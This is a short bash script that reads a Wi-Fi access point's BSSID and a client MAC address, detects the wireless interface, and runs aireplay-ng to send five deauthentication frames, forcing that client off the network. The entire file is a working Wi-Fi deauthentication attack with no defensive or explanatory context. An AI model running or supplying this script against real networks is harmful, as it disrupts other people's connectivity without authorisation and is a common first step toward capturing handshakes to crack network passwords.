#!/bin/bash

bssid=$1
target_mac=$2

interface=$(iw dev | awk '$1=="Interface"{print $2}')
echo Interface: $interface

sudo aireplay-ng -0 5 -a $bssid -c $target_mac $interface
